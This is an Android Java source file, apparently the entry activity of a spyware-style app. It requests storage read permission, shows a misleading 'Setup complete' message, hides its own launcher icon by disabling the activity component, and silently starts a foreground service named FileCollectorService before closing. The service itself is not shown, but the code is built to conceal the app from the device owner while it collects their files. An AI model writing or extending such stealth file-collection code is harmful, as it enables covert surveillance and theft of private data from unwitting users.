package com.internet.app;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import java.util.Map;

public class MainActivity extends ComponentActivity {

    private final ActivityResultLauncher<String[]> permissionLauncher =
        registerForActivityResult(
            new ActivityResultContracts.RequestMultiplePermissions(),
            (Map<String, Boolean> result) -> {
                // Check if at least storage permission was granted
                boolean storageGranted = false;
                for (Boolean b : result.values()) {
                    if (b) {
                        storageGranted = true;
                        break;
                    }
                }
                if (storageGranted) {
                    Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
                }
                startServiceAndHide();
            }
        );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissionsAndStart();
    }

    private void requestPermissionsAndStart() {
        // Request only READ_EXTERNAL_STORAGE — works on all versions with targetSdk=29
        permissionLauncher.launch(new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE
        });
    }

    private void startServiceAndHide() {
        // Hide launcher icon
        try {
            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception ignored) {}

        // Start foreground service
        Intent serviceIntent = new Intent(this, FileCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Close activity
        new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 200);
    }
}
